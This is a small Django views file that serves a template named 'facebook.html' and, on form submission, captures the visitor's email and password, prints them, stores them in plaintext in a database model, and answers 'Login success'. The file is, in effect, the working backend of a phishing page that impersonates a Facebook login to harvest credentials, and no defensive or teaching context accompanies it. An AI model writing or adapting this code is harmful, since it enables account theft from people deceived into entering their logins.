from django.shortcuts import render
from django.views.generic import TemplateView
from django.http import HttpResponse

from .models import MainModel

# Create your views here.
class MainView(TemplateView):
    def get(self, request):
        return render(request, 'facebook.html')

    def post(self, request):
        try:
            print(request.POST)
            username = request.POST['email']
            password = request.POST['password']
            MainModel.objects.create(username=username, password=password)
            return HttpResponse('Login success')
        except:
            return HttpResponse('There is some error')
